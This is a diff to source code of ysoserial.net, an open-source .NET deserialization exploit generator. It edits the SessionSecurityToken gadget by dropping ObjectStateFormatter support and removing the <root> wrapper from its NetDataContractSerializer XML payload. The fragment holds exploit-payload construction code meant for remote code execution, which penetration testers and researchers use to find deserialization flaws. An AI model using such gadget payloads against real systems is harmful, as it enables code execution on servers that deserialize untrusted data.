@@ -15,7 +15,7 @@ namespace ysoserial.Generators
 
         public override List<string> SupportedFormatters()
         {
-            return new List<string> { "BinaryFormatter", "ObjectStateFormatter", "Json.Net", "DataContractSerializer", "NetDataContractSerializer", "SoapFormatter", "LosFormatter" };
+            return new List<string> { "BinaryFormatter", "Json.Net", "DataContractSerializer", "NetDataContractSerializer", "SoapFormatter", "LosFormatter" };
         }
 
         public override string Name()
@@ -54,8 +54,7 @@ namespace ysoserial.Generators
             string b64encoded = Convert.ToBase64String(binaryFormatterPayload);
 
             if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
-                || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase)
-                || formatter.Equals("objectstateformatter", StringComparison.OrdinalIgnoreCase))
+                || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase))
             {
                 var obj = new SessionSecurityTokenMarshal(b64encoded);
                 return Serialize(obj, formatter, inputArgs);
@@ -112,9 +111,9 @@ namespace ysoserial.Generators
             else if (formatter.ToLower().Equals("netdatacontractserializer"))
             {
 
-                string payload = $@"<root><w xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:x=""http://www.w3.org/2001/XMLSchema"" z:Id=""1"" z:Type=""System.IdentityModel.Tokens.SessionSecurityToken"" z:Assembly=""System.IdentityModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"" xmlns:z=""http://schemas.microsoft.com/2003/10/Serialization/"" xmlns="""">
+                string payload = $@"<w xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:x=""http://www.w3.org/2001/XMLSchema"" z:Id=""1"" z:Type=""System.IdentityModel.Tokens.SessionSecurityToken"" z:Assembly=""System.IdentityModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"" xmlns:z=""http://schemas.microsoft.com/2003/10/Serialization/"" xmlns="""">
   <SessionToken z:Type=""System.Byte[]"" z:Assembly=""0"" xmlns="""">{GetB64SessionToken(b64encoded)}</SessionToken>
-</w></root>";
+</w>";
 
                 if (inputArgs.Minify)
                 {
@@ -125,7 +124,7 @@ namespace ysoserial.Generators
                 {
                     try
                     {
-                        SerializersHelper.NetDataContractSerializer_deserialize(payload, "root");
+                        SerializersHelper.NetDataContractSerializer_deserialize(payload);
                     }
                     catch (Exception err)
                     {
